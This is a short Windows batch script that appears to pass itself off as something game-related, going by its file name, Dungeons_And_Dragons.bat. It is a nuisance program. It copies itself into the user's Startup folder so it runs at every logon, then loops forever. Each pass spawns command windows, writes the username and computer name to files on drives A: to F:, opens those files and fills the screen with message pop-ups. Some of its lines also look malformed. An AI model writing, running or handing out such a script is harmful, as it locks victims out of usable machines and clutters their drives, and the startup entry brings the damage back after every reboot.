@echo off
move Dungeons_And_Dragons.bat "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
set a=1
set b=0
set c=0
:1
set /a b=%a%=%b%
set c=%b%
start
cmd
echo %c% %username% %computername% %b% >> "A:\%c%.txt"
msg * %c%%b%
echo %c% %username% %computername% %b% >> "C:\%c%.txt"
echo %c% %username% %computername% %b% >> "F:\%c%.txt"
start
echo %c% %username% %computername% %b% >> "B:\%c%.txt"
echo %c% %username% %computername% %b% >> "D:\%c%.txt"
echo %c% %username% %computername% %b% >> "E:\%c%.txt"
msg * %c%%b%
start "A:\%c%.txt"
cmd
start "B:\%c%.txt"
start "C:\%c%.txt"
start
msg * %c%%b%
start "C:\%c%.txt"
start "E:\%c%.txt"
cmd
start "F:\%c%.txt"
echo %b%
title %b%
goto :1